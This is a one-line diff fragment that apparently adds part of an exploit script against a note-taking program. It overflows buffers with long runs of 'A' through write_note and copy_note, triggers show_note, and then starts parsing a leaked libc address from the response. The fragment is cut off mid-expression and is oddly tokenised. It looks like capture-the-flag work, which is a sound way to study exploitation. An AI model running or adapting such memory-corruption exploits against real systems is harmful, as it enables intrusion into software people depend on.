@@ -1,0 +1,1 @@
+( b " A " * 200 ) write_note ( b " A " * 200 ) write_note ( b " A " * 224 ) copy_note ( 0 , len ( payload )) show_note () resp = r . recvall () r . close () write_libc = u64 ( resp [ len ( payload
